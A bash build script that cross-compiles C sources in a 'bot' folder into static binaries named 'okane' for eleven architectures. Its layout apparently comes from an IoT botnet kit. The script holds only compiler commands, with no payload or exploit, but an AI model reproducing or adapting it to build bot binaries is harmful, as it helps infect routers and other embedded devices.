#!/bin/bash

/etc/xcompile/armv4l/bin/armv4l-gcc /root/bot/*.c -o /root/release/okane.arm -Darm -w -static
/etc/xcompile/armv5l/bin/armv5l-gcc /root/bot/*.c -o /root/release/okane.arm5 -Darm5 -w -static
/etc/xcompile/armv6l/bin/armv6l-gcc /root/bot/*.c -o /root/release/okane.arm6 -Darm6 -w -static
/etc/xcompile/armv7l/bin/armv7l-gcc /root/bot/*.c -o /root/release/okane.arm7 -Darm7 -w -static
/etc/xcompile/powerpc/bin/powerpc-gcc /root/bot/*.c -o /root/release/okane.ppc -Dppc -w -static
/etc/xcompile/sparc/bin/sparc-gcc /root/bot/*.c -o /root/release/okane.spc -Dspc -w -static
/etc/xcompile/m68k/bin/m68k-gcc /root/bot/*.c -o /root/release/okane.m68k -Dm68k -w -static
/etc/xcompile/sh4/bin/sh4-gcc /root/bot/*.c -o /root/release/okane.sh4 -Dsh4 -w -static
/etc/xcompile/mips/bin/mips-gcc /root/bot/*.c -o /root/release/okane.mips -Dmips -w -static
/etc/xcompile/mipsel/bin/mipsel-gcc /root/bot/*.c -o /root/release/okane.mipsl -Dmipsel -w -static
/etc/xcompile/i586/bin/i586-gcc /root/bot/*.c -o /root/release/okane.x86 -Dx86 -w -static